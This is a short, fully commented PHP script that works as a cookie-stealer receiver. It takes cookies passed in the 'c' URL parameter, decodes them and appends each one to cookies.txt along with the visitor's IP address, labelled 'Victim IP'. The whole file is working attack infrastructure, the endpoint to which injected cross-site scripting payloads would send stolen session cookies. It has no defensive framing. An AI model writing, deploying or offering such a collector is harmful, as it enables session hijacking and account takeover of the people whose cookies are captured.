<?php
    // Check if the 'c' parameter is set in the URL's query string
    if (isset($_GET['c'])) {
        // Split the value of 'c' parameter at every semicolon and store in $list
        $list = explode(";", $_GET['c']);

        // Iterate over each element in the $list array
        foreach ($list as $key => $value) {
            // Decode any URL-encoded characters in the $value
            $cookie = urldecode($value);

            // Open or create 'cookies.txt' for reading and writing; file pointer at end
            $file = fopen("cookies.txt", "a+");

            // Write the user's IP address and the decoded cookie to 'cookies.txt'
            // Each entry is on a new line
            fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");

            // Close the file
            fclose($file);
        }
    }
?>
